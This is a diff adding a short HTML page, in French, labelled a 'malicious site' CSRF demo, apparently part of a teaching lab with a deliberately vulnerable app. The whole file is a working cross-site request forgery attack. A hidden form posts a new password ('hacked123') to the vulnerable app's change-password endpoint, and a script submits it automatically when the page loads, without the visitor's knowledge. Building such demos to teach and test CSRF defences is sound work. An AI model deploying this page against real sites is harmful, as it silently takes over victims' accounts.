@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Site Malveillant - CSRF Demo</title>
+</head>
+<body>
+<h1>Site Malveillant</h1>
+<p>Ce site va changer votre mot de passe sur le site vulnérable sans que vous le sachiez !</p>
+<!-- Formulaire caché qui envoie une requête POST vers le site vulnérable -->
+<form
+        action="http://vulnerable_app:5000/change_password"
+        method="POST"
+        style="display:none;"
+        id="csrf_form"
+>
+    <input type="hidden" name="new_password" value="hacked123">
+</form>
+<script>
+    // Soumet automatiquement le formulaire au chargement de la page
+    document.getElementById("csrf_form").submit();
+</script>
+</body>
+</html>
